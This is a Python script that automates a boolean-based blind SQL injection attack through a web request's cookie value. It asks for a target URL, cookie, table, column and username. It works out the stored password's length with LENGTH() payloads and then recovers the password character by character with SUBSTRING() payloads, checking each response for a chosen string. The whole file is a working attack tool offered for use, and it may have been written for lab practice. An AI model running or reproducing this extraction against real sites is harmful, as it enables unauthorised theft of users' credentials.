import sys
import requests
import os
from string import ascii_lowercase, ascii_uppercase


#create a function that asks the user if he wants to use a file or not
def ask_user_known_data(request_content):
    #clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    print("Just the URL is required for the Custom Request option.\n")
    request_content["url"] = input("URL: ")
    request_content["cookie_name"] = input("Cookie name: ")
    request_content["cookie_value"] = input("Cookie value: ")
    request_content["string"] = input("String condition: ")
    request_content["table"] = input("Table name: ")
    request_content["user_column"] = input("Username column name: ")
    request_content["pass_column"] = input("Passwords column name: ")
    request_content["user"] = input("Username: ")


#make a request function
def request_function(url,cookie_name,cookie_value,url_payload,cookie_payload):

    if cookie_name == "":
        try:
            response = requests.get(url + url_payload)
        except:
            print("Error: Invalid URL")
            sys.exit()
    else:
        try:
            response = requests.get(url + url_payload, cookies={cookie_name : cookie_value + cookie_payload})
        except:
            print("Error: Invalid URL")
            sys.exit()
    return response


#create function that check tables
def custom():
    request_content = {}
    ask_user_known_data(request_content)

    #if cookie_name is blank then make the request without the cookie
    response = request_function(request_content["url"],request_content["cookie_name"],request_content["cookie_value"],"","")
    
    #check if theres a specific string on the web content

    if not request_content["string"]=="" and request_content["string"] in response.text:
        
        print("\n")
        print("|----------------------------- TRUE!! ----------------------------------|")
        print("\n")
    else:
        print("\n")
        print("|----------------------------- false ----------------------------------|")
        print("\n")


#function that finds length of password
def find_password_length(url_request,cookie_name,cookie_value,condition_string,table,user_column,pass_column,user):
    password_length = 0
    for i in range(0,100):
        payload = "' AND (SELECT 'a' FROM "+ table +" WHERE "+ user_column +"='"+ user +"' AND LENGTH("+ pass_column +")="+str(i)+")='a"
        response = request_function(url_request,cookie_name,cookie_value,"",payload)
        if condition_string in response.text:
            password_length = i
            break
    if password_length == 0:
        print("Error: Unable to check password length.")
        sys.exit()
    return password_length


#create wordlist function
def create_wordlist():
    print("""
    1. abc
    2. ABC
    3. 123
    """)
    wordlist_choice = input("What wordlist would you like to use? (You can choose multiple options): ")
    wordlist = ""
    if "1" in wordlist_choice:
        wordlist = ascii_lowercase
    if "2" in wordlist_choice:
        wordlist += ascii_uppercase
    if "3" in wordlist_choice:
        wordlist += "1234567890"
    
    print(wordlist)
    return wordlist


#create a function that bruteforces the password
def bruteforce():
    request_content = {}

    ask_user_known_data(request_content)

    wordlist = create_wordlist()

    password_length=find_password_length(request_content["url"],request_content["cookie_name"],request_content["cookie_value"],request_content["string"],request_content["table"],request_content["user_column"],request_content["pass_column"],request_content["user"])

    password = []

    for i in range(0,password_length):
        password.append("*")
    #clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    print("Password: "+ ''.join(password))

    for i in range(1,password_length+1):
        for j in list(wordlist):
            payload = "' AND SUBSTRING((SELECT "+ request_content["pass_column"] +" FROM "+ request_content["table"] +" WHERE "+ request_content["user_column"] +"='"+ request_content["user"] +"'),"+str(i)+",1)='"+str(j)

            response = request_function(request_content["url"],request_content["cookie_name"],request_content["cookie_value"],"",payload)

            if request_content["string"]!="" and request_content["string"] in response.text:
                password[i-1] = str(j)
                #clear screen
                os.system('cls' if os.name == 'nt' else 'clear')
                print("\n")
                print("Password: "+ ''.join(password))
                break

    print("\n")

    print("FINISHED!!!")


#create a menu that initiates the options
def menu():
    print("""
    1. Custom Request.
    2. Bruteforce password with SQLi.
    3. Quit.
    """)


#create a function that runs the menu and the options
def main():
    #clear screen 
    os.system('cls' if os.name == 'nt' else 'clear')
    menu()
    print("\n")
    choice = input("What would you like to do? ")
    print("\n")
    if choice == "1":
        custom()
        #pause the program 
        input("\n\nPress enter to continue...")
        menu()
        main()
    elif choice == "2":
        bruteforce()
    elif choice == "3":
        sys.exit()
    else:
        print("Invalid choice. Please try again.")
        print("\n") 
        menu()
        main()


#initial flow of the program
main()